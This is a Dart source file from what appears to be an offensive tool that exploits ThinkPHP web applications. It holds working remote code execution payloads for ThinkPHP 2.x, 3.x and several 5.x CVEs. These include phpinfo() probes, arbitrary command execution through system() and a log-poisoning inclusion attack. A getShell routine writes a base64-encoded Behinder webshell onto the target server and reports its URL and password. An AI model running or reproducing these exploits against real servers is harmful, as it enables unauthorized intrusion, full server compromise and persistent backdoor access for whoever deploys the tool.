import 'dart:convert';

import 'package:http/http.dart' as http;
import '../../app/constants.dart';
import 'thinkphp_v5_exp.dart';

/// ThinkPHP 漏洞利用核心逻辑（100% 复现 ThinkphpGUI）
/// 参考: https://github.com/Lotus6/ThinkphpGUI
class ThinkphpExpService {
  final Uri baseUri;
  final Duration timeout;
  late final ThinkphpV5ExpService _v5;

  ThinkphpExpService({
    required String url,
    this.timeout = const Duration(
      seconds: AppConstants.defaultHttpTimeoutSeconds,
    ),
  }) : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/') {
    _v5 = ThinkphpV5ExpService(
      baseUri: baseUri,
      timeout: timeout,
      getModule: _getModule,
      extractBeforeHtml: _extractBeforeHtml,
    );
  }

  static const String _phpVersionCheck = 'PHP Version';

  /// 默认模块检测顺序（与 ThinkphpGUI Module.java 一致）
  static const List<String> _defaultModules = ['manage', 'admin', 'api'];
  static const List<String> _tp3LogRceFilenameParams = [
    'value[_filename]',
    'info[_filename]',
    'param[_filename]',
    'name[_filename]',
    'array[_filename]',
    'arr[_filename]',
    'list[_filename]',
    'page[_filename]',
    'menus[_filename]',
    'var[_filename]',
    'data[_filename]',
    'module[_filename]',
  ];

  /// 预检：目标是否为 ThinkPHP（避免非 ThinkPHP 站点误报）
  Future<bool> isThinkPHP() async {
    try {
      final res = await http.get(baseUri).timeout(timeout);
      final body = res.body.toLowerCase();
      final combined = '$body ${res.headers.toString().toLowerCase()}';
      if (RegExp(
        r'thinkphp|think-php|runtime|\[ info \]|\[ error \]',
      ).hasMatch(combined)) {
        return true;
      }
      if (body.contains('php version') || body.contains('<?php')) return true;
      return false;
    } catch (_) {
      return false;
    }
  }

  /// 检测可用模块（index/manage/admin/api）
  Future<String> _getModule() async {
    final client = http.Client();
    try {
      for (final mod in _defaultModules) {
        try {
          final res = await client
              .get(Uri.parse('${baseUri}?s=/$mod'))
              .timeout(timeout);
          if (res.statusCode == 200) return mod;
        } catch (_) {}
      }
    } finally {
      client.close();
    }
    return 'index';
  }

  /// 1. ThinkPHP 5.0 RCE
  Future<ThinkphpResult> checkTp50() => _v5.checkTp50();

  /// 2. ThinkPHP 5.0.10 RCE
  Future<ThinkphpResult> checkTp5010() => _v5.checkTp5010();

  /// 3. ThinkPHP 5.0.22/5.1.29 RCE
  Future<ThinkphpResult> checkTp5022_5129() => _v5.checkTp5022_5129();

  /// 4. ThinkPHP 5.0.23 RCE（需 captcha 路由）
  Future<ThinkphpResult> checkTp5023() => _v5.checkTp5023();

  /// 5. ThinkPHP 5.0.24-5.1.30 RCE
  Future<ThinkphpResult> checkTp5024_5130() => _v5.checkTp5024_5130();

  /// 8. ThinkPHP 3.x RCE
  Future<ThinkphpResult> checkTp3() async {
    final mod = await _getModule();
    final payload =
        '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
    try {
      final res = await http.get(Uri.parse(payload)).timeout(timeout);
      if (res.body.contains(_phpVersionCheck)) {
        return ThinkphpResult(true, 'ThinkPHP 3.x RCE', payload);
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x RCE', '');
  }

  /// 10. ThinkPHP 3.x Log RCE
  Future<ThinkphpResult> checkTp3LogRce() async {
    final now = DateTime.now();
    final suffix = _tp3LogSuffix(now);
    final payloadLog =
        '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20phpinfo();?>';
    try {
      await http.get(Uri.parse(payloadLog)).timeout(timeout);
      for (final param in _tp3LogRceFilenameParams) {
        final u =
            '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 3.x Log RCE', u);
        }
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x Log RCE', '');
  }

  /// 11. ThinkPHP 2.x preg_replace /e 修饰符 RCE
  Future<ThinkphpResult> checkTp2() async {
    final urls = [
      '${baseUri}index.php?s=/index/index/name/\${@phpinfo()}',
      '$baseUri?s=/index/index/name/\${@phpinfo()}',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 2.x RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 2.x RCE', '');
  }

  /// 12. ThinkPHP 5.0.23 完整版 debug 模式（无需 captcha）
  Future<ThinkphpResult> checkTp5023Debug() => _v5.checkTp5023Debug();

  /// 13. ThinkPHP 5 View/display（POC #5）
  Future<ThinkphpResult> checkTp5ViewDisplay() => _v5.checkTp5ViewDisplay();

  /// 14. ThinkPHP 5.0/5.1/5.2 _method=filter（POC #35）
  Future<ThinkphpResult> checkTp5MethodFilter() => _v5.checkTp5MethodFilter();

  /// 15. ThinkPHP 3.x Module/Action/Param 变体（POC #17）
  Future<ThinkphpResult> checkTp3Module() async {
    final mod = await _getModule();
    final payload =
        '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
    try {
      final res = await http.get(Uri.parse(payload)).timeout(timeout);
      if (res.body.contains(_phpVersionCheck)) {
        return ThinkphpResult(true, 'ThinkPHP 3.x Module RCE', payload);
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x Module RCE', '');
  }

  /// 18. ThinkPHP 3.x module/aciton 拼写变体（POC #18）
  Future<ThinkphpResult> checkTp3ModuleTypo() async {
    final mod = await _getModule();
    final payload =
        '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
    try {
      final res = await http.get(Uri.parse(payload)).timeout(timeout);
      if (res.body.contains(_phpVersionCheck)) {
        return ThinkphpResult(true, 'ThinkPHP 3.x module/aciton RCE', payload);
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x module/aciton RCE', '');
  }

  // ========== 批量检测 ==========

  /// 检测单个漏洞类型
  Future<ThinkphpResult> checkSingle(ThinkphpVulnType type) async {
    switch (type) {
      case ThinkphpVulnType.tp50:
        return checkTp50();
      case ThinkphpVulnType.tp5010:
        return checkTp5010();
      case ThinkphpVulnType.tp5022_5129:
        return checkTp5022_5129();
      case ThinkphpVulnType.tp5023:
        return checkTp5023();
      case ThinkphpVulnType.tp5023Debug:
        return checkTp5023Debug();
      case ThinkphpVulnType.tp5024_5130:
        return checkTp5024_5130();
      case ThinkphpVulnType.tp5ViewDisplay:
        return checkTp5ViewDisplay();
      case ThinkphpVulnType.tp5MethodFilter:
        return checkTp5MethodFilter();
      case ThinkphpVulnType.tp3:
        return checkTp3();
      case ThinkphpVulnType.tp3Module:
        return checkTp3Module();
      case ThinkphpVulnType.tp3ModuleTypo:
        return checkTp3ModuleTypo();
      case ThinkphpVulnType.tp3LogRce:
        return checkTp3LogRce();
      case ThinkphpVulnType.tp2:
        return checkTp2();
    }
  }

  /// 检测多个漏洞类型
  Future<List<ThinkphpResult>> checkMultiple(
    List<ThinkphpVulnType> types,
  ) async {
    final results = <ThinkphpResult>[];
    for (final t in types) {
      results.add(await checkSingle(t));
    }
    return results;
  }

  /// 检测全部 RCE 漏洞
  Future<List<ThinkphpResult>> checkAllRce() async {
    return checkMultiple([
      ThinkphpVulnType.tp2,
      ThinkphpVulnType.tp50,
      ThinkphpVulnType.tp5010,
      ThinkphpVulnType.tp5022_5129,
      ThinkphpVulnType.tp5023,
      ThinkphpVulnType.tp5023Debug,
      ThinkphpVulnType.tp5024_5130,
      ThinkphpVulnType.tp5ViewDisplay,
      ThinkphpVulnType.tp5MethodFilter,
      ThinkphpVulnType.tp3,
      ThinkphpVulnType.tp3Module,
      ThinkphpVulnType.tp3ModuleTypo,
      ThinkphpVulnType.tp3LogRce,
    ]);
  }

  // ========== RCE 命令执行 ==========

  /// 执行命令（需先通过 check 确定漏洞类型）
  Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
    switch (type) {
      case ThinkphpVulnType.tp2:
        final urls = [
          '${baseUri}index.php?s=/index/index/name/\${@system(\'$cmd\')}',
          '$baseUri?s=/index/index/name/\${@system(\'$cmd\')}',
        ];
        for (final u in urls) {
          try {
            final res = await http.get(Uri.parse(u)).timeout(timeout);
            final out = _extractBeforeHtml(res.body);
            if (out.isNotEmpty) return out;
          } catch (_) {}
        }
        return null;
      case ThinkphpVulnType.tp50:
      case ThinkphpVulnType.tp5010:
      case ThinkphpVulnType.tp5022_5129:
      case ThinkphpVulnType.tp5023:
      case ThinkphpVulnType.tp5023Debug:
      case ThinkphpVulnType.tp5ViewDisplay:
      case ThinkphpVulnType.tp5MethodFilter:
      case ThinkphpVulnType.tp5024_5130:
        return _v5.exeRce(type, cmd);
      case ThinkphpVulnType.tp3Module:
        final mod = await _getModule();
        final encodedCmd = Uri.encodeComponent(cmd);
        final u =
            '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp3ModuleTypo:
        final mod = await _getModule();
        final encodedCmd = Uri.encodeComponent(cmd);
        final u =
            '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp3:
        final mod = await _getModule();
        final encodedCmd = Uri.encodeComponent(cmd);
        final u =
            '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp3LogRce:
        return _executeTp3LogRce(cmd);
    }
  }

  /// GetShell（写入 php_behinder.php，使用内置冰蝎马）
  /// [shellContent] 为 assets/defaults/payloads/webshell/php_behinder.php 的内容
  Future<String?> getShell(
    ThinkphpVulnType type,
    String shellContent, {
    String password = AppConstants.defaultShellPassword,
  }) async {
    switch (type) {
      case ThinkphpVulnType.tp2:
        const shellFile = 'php_behinder.php';
        final shellB64 = base64.encode(utf8.encode(shellContent));
        final writeCmd = Uri.encodeComponent(
          "echo '$shellB64'|base64 -d>$shellFile",
        );
        final writeUrls = [
          '${baseUri}index.php?s=/index/index/name/\${@system(\'$writeCmd\')}',
          '$baseUri?s=/index/index/name/\${@system(\'$writeCmd\')}',
        ];
        for (final u in writeUrls) {
          try {
            await http.get(Uri.parse(u)).timeout(timeout);
          } catch (_) {}
        }
        final check2 = await http
            .get(Uri.parse('$baseUri$shellFile'))
            .timeout(timeout);
        if (check2.statusCode == 200)
          return '$baseUri$shellFile Pass:$password';
        return null;
      case ThinkphpVulnType.tp50:
      case ThinkphpVulnType.tp5010:
      case ThinkphpVulnType.tp5022_5129:
      case ThinkphpVulnType.tp5023:
      case ThinkphpVulnType.tp5023Debug:
      case ThinkphpVulnType.tp5ViewDisplay:
      case ThinkphpVulnType.tp5MethodFilter:
      case ThinkphpVulnType.tp5024_5130:
        return _v5.getShell(type, shellContent, password: password);
      case ThinkphpVulnType.tp3Module:
        final mod = await _getModule();
        const shellFile = 'php_behinder.php';
        final shellPass = password;
        final shellB64 = base64.encode(utf8.encode(shellContent));
        final cmd = Uri.encodeComponent(
          "echo '$shellB64'|base64 -d>$shellFile",
        );
        final u =
            '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http
            .get(Uri.parse('$baseUri$shellFile'))
            .timeout(timeout);
        if (check.statusCode == 200)
          return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp3ModuleTypo:
        final mod = await _getModule();
        const shellFile = 'php_behinder.php';
        final shellPass = password;
        final shellB64 = base64.encode(utf8.encode(shellContent));
        final cmd = Uri.encodeComponent(
          "echo '$shellB64'|base64 -d>$shellFile",
        );
        final u =
            '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http
            .get(Uri.parse('$baseUri$shellFile'))
            .timeout(timeout);
        if (check.statusCode == 200)
          return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp3:
        final mod = await _getModule();
        const shellFile = 'php_behinder.php';
        final shellPass = password;
        final shellB64 = base64.encode(utf8.encode(shellContent));
        // TP3 使用 system 执行命令写入
        final cmd = Uri.encodeComponent(
          "echo '$shellB64'|base64 -d>$shellFile",
        );
        final u =
            '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http
            .get(Uri.parse('$baseUri$shellFile'))
            .timeout(timeout);
        if (check.statusCode == 200)
          return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp3LogRce:
        const shellFile = 'php_behinder.php';
        final shellPass = password;
        final shellB64 = base64.encode(utf8.encode(shellContent));
        await _executeTp3LogRce("echo '$shellB64'|base64 -d>$shellFile");
        final check = await http
            .get(Uri.parse('$baseUri$shellFile'))
            .timeout(timeout);
        if (check.statusCode == 200)
          return '$baseUri$shellFile Pass:$shellPass';
        return null;
    }
  }

  String _tp3LogSuffix(DateTime now) {
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    return '${y.substring(2)}_${m}_$d.log';
  }

  Future<String?> _executeTp3LogRce(String cmd) async {
    const begin = 'MATRIX_TP3_LOG_BEGIN';
    const end = 'MATRIX_TP3_LOG_END';
    final encodedCmd = Uri.encodeComponent(cmd);
    final suffix = _tp3LogSuffix(DateTime.now());
    final payload = Uri.encodeComponent(
      '--> <?php echo "$begin"; system(\$_GET["x"]); echo "$end";?>',
    );
    final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=$payload';
    await http.get(Uri.parse(payloadLog)).timeout(timeout);

    for (final param in _tp3LogRceFilenameParams) {
      final logRes =
          '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix&x=$encodedCmd';
      final res = await http.get(Uri.parse(logRes)).timeout(timeout);
      final body = res.body;
      final start = body.indexOf(begin);
      final finish = body.indexOf(end, start + begin.length);
      if (start != -1 && finish != -1 && finish >= start) {
        return body.substring(start + begin.length, finish).trim();
      }
    }
    return null;
  }

  String _extractBeforeHtml(String body) {
    final idx = body.indexOf('<');
    if (idx <= 0) return body;
    final res = body.substring(0, idx).trim();
    return res.isEmpty ? body : res;
  }
}

enum ThinkphpVulnType {
  tp2,
  tp50,
  tp5010,
  tp5022_5129,
  tp5023,
  tp5023Debug,
  tp5024_5130,
  tp5ViewDisplay,
  tp5MethodFilter,
  tp3,
  tp3Module,
  tp3ModuleTypo,
  tp3LogRce,
}

extension ThinkphpVulnTypeExt on ThinkphpVulnType {
  String get label {
    switch (this) {
      case ThinkphpVulnType.tp2:
        return 'ThinkPHP 2.x · preg_replace /e RCE';
      case ThinkphpVulnType.tp50:
        return 'ThinkPHP CVE-2018-20062 · 5.0 invokefunction RCE';
      case ThinkphpVulnType.tp5010:
        return 'ThinkPHP CVE-2018-20062 · 5.0.10 assert RCE';
      case ThinkphpVulnType.tp5022_5129:
        return 'ThinkPHP CVE-2018-20062 · 5.0.22/5.1.29 invokefunction RCE';
      case ThinkphpVulnType.tp5023:
        return 'ThinkPHP CVE-2019-9082 · 5.0.23 captcha RCE';
      case ThinkphpVulnType.tp5023Debug:
        return 'ThinkPHP CVE-2019-9082 · 5.0.23 Debug RCE';
      case ThinkphpVulnType.tp5024_5130:
        return 'ThinkPHP CVE-2018-20062 · 5.0.24-5.1.30 template/write RCE';
      case ThinkphpVulnType.tp5ViewDisplay:
        return 'ThinkPHP CVE-2018-20062 · 5.x View/display RCE';
      case ThinkphpVulnType.tp5MethodFilter:
        return 'ThinkPHP CVE-2019-9082 · 5.x _method=filter RCE';
      case ThinkphpVulnType.tp3:
        return 'ThinkPHP 3.x · RCE';
      case ThinkphpVulnType.tp3Module:
        return 'ThinkPHP 3.x · Module RCE';
      case ThinkphpVulnType.tp3ModuleTypo:
        return 'ThinkPHP 3.x · module/action RCE';
      case ThinkphpVulnType.tp3LogRce:
        return 'ThinkPHP 3.x · Log RCE';
    }
  }

  bool get supportsRce {
    return true;
  }

  /// 是否支持 GetShell
  bool get supportsGetShell {
    return supportsRce;
  }
}

class ThinkphpResult {
  final bool vulnerable;
  final String vulnName;
  final String detail;

  ThinkphpResult(this.vulnerable, this.vulnName, this.detail);
}
